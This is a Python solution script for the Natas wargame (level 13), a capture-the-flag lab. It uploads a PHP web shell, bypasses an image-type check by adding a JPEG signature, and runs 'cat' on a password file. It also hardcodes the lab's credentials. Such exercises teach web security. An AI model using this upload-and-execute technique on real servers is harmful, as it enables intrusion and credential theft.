#!/bin/python3

import requests
import re
import html.parser

username = 'natas13'
password = 'jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY'


url = 'http://%s.natas.labs.overthewire.org' % (username)
data = { "filename" : "phpinject13.php",  "MAX_FILE_SIZE" : "1000" }
files = { "uploadedfile" : open("phpinject13.php", "rb") } 
#cookie = { "data" : "ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK"}

#for communicating with the website whilst maintaining session history
session = requests.Session()
response = session.post(url + '',data = data ,files = files ,auth = (username,password) )

content = html.unescape(response.text)
#print (content)
fileurl = "/"+(re.findall('.php\">(.*.php)',content)[0]) + "?var=cat /etc/natas_webpass/natas14"

response = session.get(url + fileurl, auth = (username, password))
content = html.unescape(response.text)

#for viewing the webpage
print (re.findall('\n(.*)',content.strip())[4])

#for finding the password 
#print (re.findall('.php\">(.*.php)',content)[0])

#this is very similar to the last one but the file is being checked by
#the php function exif_imagetype()
#a quick search shows that this only checks the first couple of bytes of a file
#for the signature
#this means we can add the signature of a jpeg file to the start of our script 
#to avoid this obstacle


